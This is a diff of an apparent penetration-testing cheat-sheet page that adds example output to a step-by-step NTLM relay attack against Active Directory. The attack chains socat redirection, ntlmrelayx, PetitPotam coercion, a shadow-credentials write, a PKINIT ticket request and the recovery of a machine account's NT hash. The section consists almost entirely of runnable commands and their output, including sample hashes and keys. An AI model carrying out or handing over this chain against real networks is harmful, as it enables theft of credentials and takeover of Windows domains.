@@ -343,8 +343,12 @@ body.dark-mode #dynamicFormContainer button:hover {
   <h3 id="ntlm-relay-attack">NTLM Relay Attack</h3>
 <h4 id="1-run-socat-to-redirect-traffic-in-windows-target">1. Run socat to redirect traffic (In Windows Target)</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Upload socat.zip and unzip
-</span></span><span class="line"><span class="cl"><span class="go">Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory(&#39;c:\programdata\socat.zip&#39;, &#39;c:\programdata&#39;)
+</span></span><span class="line"><span class="cl"><span class="go">Expand-Archive -Path &#34;&lt;SOCAT_ZIP_FILE_PATH&gt;&#34; -DestinationPath &#34;&lt;DEST_PATH&gt;&#34; -Force
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\xampp\htdocs&gt; Expand-Archive -Path &#34;C:\xampp\htdocs\socat.zip&#34; -DestinationPath &#34;C:\xampp\htdocs\&#34; -Force
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\socat.exe tcp-listen:8090,reuseaddr,fork tcp:&lt;LOCAL_IP&gt;:80
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\xampp\htdocs\socat-windows-master&gt; .\socat.exe tcp-listen:8090,reuseaddr,fork tcp:10.10.14.31:80
+</span></span></span><span class="line"><span class="cl"><span class="go">      0 [main] socat 2084 find_fast_cwd: WARNING: Couldn&#39;t compute FAST_CWD pointer.  Please report this problem to
+</span></span></span><span class="line"><span class="cl"><span class="go">the public mailing list cygwin@cygwin.com
 </span></span></span></code></pre></div><p><small><em>Ref: <a href="https://codeload.github.com/StudioEtrange/socat-windows/zip/refs/heads/master">socat</a></em></small></p>
 <h4 id="2-enable-webdav-in-windows-target">2. Enable webdav (In Windows Target)</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">Source</span> <span class="o">=</span> @<span class="s2">&#34;
@@ -417,7 +421,7 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go">[JosL.WebClient.Starter]::startService()
 </span></span></span></code></pre></div><br>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Run enable_webdav.ps1
-</span></span><span class="line"><span class="cl"><span class="go">C:\programdata\enable_webdav.ps1
+</span></span><span class="line"><span class="cl"><span class="go">C:\xampp\htdocs\enable_webdav.ps1
 </span></span></span></code></pre></div><h4 id="3-start-ntlmrelayx-listener-in-local-linux">3. Start ntlmrelayx listener (In Local Linux)</h4>
 <h4 id="get-impacket-fork--add-shadow-credentials-commands-to-ntlmrelayxs-interactive-ldap-shell">Get impacket fork : Add Shadow Credentials Commands to Ntlmrelayx&rsquo;s Interactive LDAP Shell</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">git clone -b interactive-ldap-shadow-creds https://github.com/Tw1sm/impacket.git
@@ -428,20 +432,101 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">pip install .
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">pip3 install impacket pyOpenSSL==24.0.0
 </span></span></span></code></pre></div><h4 id="run-ntlmrelayx">Run ntlmrelayx</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">proxychains4 examples/ntlmrelayx.py -t ldaps://&lt;DC&gt; --delegate-access -i
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">ntlmrelayx.py -t ldaps://&lt;DC&gt; --delegate-access -i
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> ntlmrelayx.py -t ldaps://192.168.100.100 --delegate-access -i
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Impacket v0.10.1.dev1+20220912.224808.5fcd5e81 - Copyright 2022 SecureAuth Corporation
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Protocol Client DCSYNC loaded..
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Protocol Client HTTP loaded..
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Protocol Client HTTPS loaded..
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Protocol Client IMAP loaded..
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Protocol Client IMAPS loaded..
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Protocol Client LDAPS loaded..
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Protocol Client LDAP loaded..
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Protocol Client MSSQL loaded..
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Protocol Client RPC loaded..
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Protocol Client SMB loaded..
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Protocol Client SMTP loaded..
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Running in relay mode to single host
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Setting up SMB Server
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Setting up HTTP Server on port 80
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Setting up WCF Server
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Setting up RAW Server on port 6666
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Servers started, waiting for connections
 </span></span></span></code></pre></div><h4 id="4-run-petitpotam-in-local-linux">4. Run PetitPotam (In Local Linux)</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">proxychains4 python3 PetitPotam.py -u &lt;USER&gt; -hashes :&lt;HASH&gt; &lt;SOCAT_HOSTNAME&gt;@8090/test &lt;SOCAT_LISTENER_IP&gt; -pipe all
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 PetitPotam.py -u &#39;&lt;USER&gt;@&lt;DOMAIN&gt;&#39; -hashes :&lt;HASH&gt; &lt;SOCAT_HOSTNAME&gt;@8090/test &lt;SOCAT_LISTENER_IP&gt; -pipe all
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 PetitPotam.py -u &#34;test.user@example.com&#34; -hashes &#34;:7ddf32e17a6ac5ce04a8ecbf782ca509&#34; ms01@8090/test 192.168.100.101 -pipe all
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">                                                                                               
+</span></span></span><span class="line"><span class="cl"><span class="go">              ___            _        _      _        ___            _                     
+</span></span></span><span class="line"><span class="cl"><span class="go">             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
+</span></span></span><span class="line"><span class="cl"><span class="go">             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | &#39;  \  
+</span></span></span><span class="line"><span class="cl"><span class="go">            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
+</span></span></span><span class="line"><span class="cl"><span class="go">          _| &#34;&#34;&#34; |_|&#34;&#34;&#34;&#34;&#34;|_|&#34;&#34;&#34;&#34;&#34;|_|&#34;&#34;&#34;&#34;&#34;|_|&#34;&#34;&#34;&#34;&#34;|_| &#34;&#34;&#34; |_|&#34;&#34;&#34;&#34;&#34;|_|&#34;&#34;&#34;&#34;&#34;|_|&#34;&#34;&#34;&#34;&#34;|_|&#34;&#34;&#34;&#34;&#34;| 
+</span></span></span><span class="line"><span class="cl"><span class="go">          &#34;`-0-0-&#39;&#34;`-0-0-&#39;&#34;`-0-0-&#39;&#34;`-0-0-&#39;&#34;`-0-0-&#39;&#34;`-0-0-&#39;&#34;`-0-0-&#39;&#34;`-0-0-&#39;&#34;`-0-0-&#39;&#34;`-0-0-&#39; 
+</span></span></span><span class="line"><span class="cl"><span class="go">                                         
+</span></span></span><span class="line"><span class="cl"><span class="go">              PoC to elicit machine account authentication via some MS-EFSRPC functions
+</span></span></span><span class="line"><span class="cl"><span class="go">                                      by topotam (@topotam77)
+</span></span></span><span class="line"><span class="cl"><span class="go">      
+</span></span></span><span class="line"><span class="cl"><span class="go">                     Inspired by @tifkin_ &amp; @elad_shamir previous work on MS-RPRN
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Trying pipe efsr
+</span></span></span><span class="line"><span class="cl"><span class="go">[-] Connecting to ncacn_np:192.168.100.101[\PIPE\efsrpc]
+</span></span></span><span class="line"><span class="cl"><span class="go">Something went wrong, check error status =&gt; SMB SessionError: STATUS_OBJECT_NAME_NOT_FOUND(The object name is not found.)
+</span></span></span><span class="line"><span class="cl"><span class="go">Trying pipe lsarpc
+</span></span></span><span class="line"><span class="cl"><span class="go">[-] Connecting to ncacn_np:192.168.100.101[\PIPE\lsarpc]
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Connected!
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Successfully bound!
+</span></span></span><span class="line"><span class="cl"><span class="go">[-] Sending EfsRpcOpenFileRaw!
+</span></span></span><span class="line"><span class="cl"><span class="go">[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] OK! Using unpatched function!
+</span></span></span><span class="line"><span class="cl"><span class="go">[-] Sending EfsRpcEncryptFileSrv!
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Got expected ERROR_BAD_NETPATH exception!!
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Attack worked!
+</span></span></span><span class="line"><span class="cl"><span class="go">...[SNIP]...
 </span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/topotam/PetitPotam">PetitPotam</a></em></small></p>
 <h4 id="5-connect-to-ldap-shell-in-local-linux">5. Connect to LDAP shell (In Local Linux)</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">rlwrap nc 127.0.0.1 11000
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">clear_shadow_creds &lt;SOCAT_HOSTNAME&gt;$
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> rlwrap nc 127.0.0.1 <span class="m">11000</span>
+</span></span><span class="line"><span class="cl"><span class="go">Type help for list of commands
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span> 
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">clear_shadow_creds &lt;SOCAT_HOSTNAME&gt;$
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> clear_shadow_creds ms01$
+</span></span><span class="line"><span class="cl"><span class="go">Found Target DN: CN=MS01,CN=Computers,DC=example,DC=com
+</span></span></span><span class="line"><span class="cl"><span class="go">Target SID: S-1-5-21-1045809509-3006658589-2426055941-1108
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Shadow credentials cleared successfully!
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Take Note of pfx path and password
 </span></span><span class="line"><span class="cl"><span class="go">set_shadow_creds &lt;SOCAT_HOSTNAME&gt;$
 </span></span></span></code></pre></div><h4 id="6-request-tgt-using-pfx-file-in-local-linux">6. Request TGT using pfx file (In Local Linux)</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">proxychains4 python3 gettgtpkinit.py &#39;&lt;DOMAIN&gt;/&lt;SOCAT_HOSTNAME&gt;$&#39; &lt;SOCAT_HOSTNAME&gt;.ccache -cert-pfx &lt;RANDOM_CHARS&gt;.pfx -pfx-pass &lt;RANDOM_CHARS_PASSWORD&gt; -dc-ip &lt;DC&gt;
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 gettgtpkinit.py &#39;&lt;DOMAIN&gt;/&lt;SOCAT_HOSTNAME&gt;$&#39; &lt;SOCAT_HOSTNAME&gt;.ccache -cert-pfx &lt;RANDOM_CHARS&gt;.pfx -pfx-pass &lt;RANDOM_CHARS_PASSWORD&gt; -dc-ip &lt;DC&gt;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 gettgtpkinit.py example.com/MS01$ MS01.ccache -cert-pfx ../impacket/h6fAqHvi.pfx -pfx-pass LDyywqG39RKUx6kmjeHr -dc-ip 192.168.100.100
+</span></span></span><span class="line"><span class="cl"><span class="go">2024-04-02 16:17:58,897 minikerberos INFO     Loading certificate and key from file
+</span></span></span><span class="line"><span class="cl"><span class="go">INFO:minikerberos:Loading certificate and key from file
+</span></span></span><span class="line"><span class="cl"><span class="go">2024-04-02 16:17:58,907 minikerberos INFO     Requesting TGT
+</span></span></span><span class="line"><span class="cl"><span class="go">INFO:minikerberos:Requesting TGT
+</span></span></span><span class="line"><span class="cl"><span class="go">2024-04-02 16:18:07,594 minikerberos INFO     AS-REP encryption key (you might need this later):
+</span></span></span><span class="line"><span class="cl"><span class="go">INFO:minikerberos:AS-REP encryption key (you might need this later):
+</span></span></span><span class="line"><span class="cl"><span class="go">2024-04-02 16:18:07,594 minikerberos INFO     7ddf32e17a6ac5ce04a8ecbf782ca509ac2b5f88fc33b7b9e0682be85784ec0d
+</span></span></span><span class="line"><span class="cl"><span class="go">INFO:minikerberos:7ddf32e17a6ac5ce04a8ecbf782ca509ac2b5f88fc33b7b9e0682be85784ec0d
+</span></span></span><span class="line"><span class="cl"><span class="go">2024-04-02 16:18:07,597 minikerberos INFO     Saved TGT to file
+</span></span></span><span class="line"><span class="cl"><span class="go">INFO:minikerberos:Saved TGT to file
 </span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/dirkjanm/PKINITtools">PKINITtools</a></em></small></p>
 <h4 id="7-get-nt-hash-in-local-linux">7. Get NT Hash (In Local Linux)</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">proxychains4 python3 getnthash.py &#39;&lt;DOMAIN&gt;/&lt;SOCAT_HOSTNAME&gt;$&#39; -key &lt;AS_REP_ENC_KEY&gt;
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 getnthash.py &#39;&lt;DOMAIN&gt;/&lt;SOCAT_HOSTNAME&gt;$&#39; -key &lt;AS_REP_ENC_KEY&gt;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> python3 getnthash.py example.com/<span class="s1">&#39;ms01$&#39;</span> -key 7ddf32e17a6ac5ce04a8ecbf782ca509ac2b5f88fc33b7b9e0682be85784ec0d
+</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.11.0 - Copyright 2023 Fortra
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Using TGT from cache
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Requesting ticket to self with PAC
+</span></span></span><span class="line"><span class="cl"><span class="go">Recovered NT Hash
+</span></span></span><span class="line"><span class="cl"><span class="go">59920e994636168744039017dcf49e54
 </span></span></span></code></pre></div>
 </div></div>
     
